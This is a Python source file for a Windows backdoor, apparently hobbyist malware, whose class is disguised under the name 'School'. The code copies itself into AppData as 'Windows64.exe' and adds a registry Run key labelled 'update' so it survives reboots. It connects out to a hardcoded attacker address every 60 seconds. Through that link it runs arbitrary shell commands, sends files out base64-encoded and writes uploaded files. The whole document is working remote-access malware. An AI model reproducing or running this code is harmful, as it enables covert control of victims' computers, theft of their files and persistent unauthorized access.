import base64
import socket
import subprocess
import json
import os
import shutil
import sys
import time






class School:
    #creat a connection with vectime
    def __init__(self, ip, port):
        self.go_shool()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def go_shool(self):
        #copy a new back door to another place beacause if target remove a backdoor the connection is closed 
        #  and also add my backdoor in register for work always
        shool_class_location = os.environ["appdata"] + "\\Windows64.exe" 
        if not os.path.exists(shool_class_location):
            shutil.copyfile(sys.executable, shool_class_location)
            subprocess.call('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v update /t  REG_SZ /d "' + shool_class_location + '"', shell=True)


#for send data to attacker pc
    def send_safe(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())




#for recive data from attakcer pc
    def safe_receive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue






# for runing cammand in  target shell 
    def run_system_commands(self, command):
        DEVNULL = open(os.devnull, "wb")
        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)
    







# the fonction for read file 
    def red_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())




#for write data in target pc 
    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] upload is successful"
    









#the is fonction for changing path 
    def change_path(self, path):
        os.chdir(path)
        if path == "..":
            return "[+] Then go back successful"
        else:
            return "[+] Changing to " + path
        



# and the is for run all past fonction
    def run(self):
        while True:
            command = self.safe_receive()
            try:
                if command[0] == "exit":
                    self.connection.close()
                elif command[0] == "cd" and len(command) > 1:
                    path = " ".join(command[1:])
                    command_result = self.change_path(path)
                elif command[0] == "ara":
                    file_name = " ".join(command[1:])
                    command_result = self.red_file(file_name).decode()
                elif command[0] == "hack":
                    command_result = self.write_file(command[1],command[2])
                else:
                    command_result = self.run_system_commands(command).decode()
            except Exception:
                command_result = "[-] Error command is not found !"

            self.send_safe(command_result)
    








# for run the backdoor evry 60 second and process erors and i hopy to like it
while True:
    time.sleep(60) 
    try:
        my_School = School("192.168.109.130", 80)
        my_School.run()
    except Exception as e:
        continue
        




